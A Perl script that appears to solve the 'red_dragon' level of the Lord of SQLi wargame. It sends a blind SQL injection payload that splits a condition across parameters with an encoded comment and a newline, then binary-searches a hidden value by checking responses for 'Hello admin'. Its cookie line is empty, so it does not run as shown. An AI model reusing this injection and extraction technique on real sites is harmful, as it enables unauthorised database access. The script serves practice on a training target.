#!/usr/bin/perl
use strict;
use warnings;
use HTTP::Tiny;

sub make_request;
sub binary_search;

my $MIN = 100000000;
my $MAX = 1000000000;

my $URL =
"https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php"
;

my $COOKIE =
;

sub binary_search {
  my ($start, $end) = @_;

  if ($start == $end) {
    print "==> " . ++$start . "\n";
    exit;
  }

  my $mid = int(($start + $end) / 2);
  my $data = make_request $mid;

  if ($data =~ m/Hello admin/i) {
    $start = $mid + 1;
  } else {
    $end = $mid - 1;
  }

  return binary_search($start, $end);
}

sub make_request {
  my $no = shift;
  my $PAYLOAD = "?id='||no>%23&no=%0A$no";

  print "Trying $no...\n";
  my $REQ = HTTP::Tiny->new->get($URL.$PAYLOAD, {
    headers => {
      "Cookie" => $COOKIE,
    },
  });

  return $REQ->{content};
}

binary_search $MIN, $MAX;

# vim:sw=2:ts=2:sts=2:et:cc=80
# End of file
